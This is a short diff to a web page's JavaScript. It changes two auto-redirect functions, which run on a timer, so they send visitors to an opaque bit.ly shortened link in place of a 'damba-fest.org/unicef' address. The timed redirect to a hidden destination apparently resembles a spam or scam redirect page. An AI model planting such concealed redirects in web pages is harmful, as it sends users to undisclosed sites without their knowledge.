@@ -4,8 +4,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://damba-fest.org/unicef";
+        location.href="https://bit.ly/yhauajjdng";
     }
     function goon(){
-        location.href="https://damba-fest.org/unicef";
+        location.href="https://bit.ly/yhauajjdng";
     }
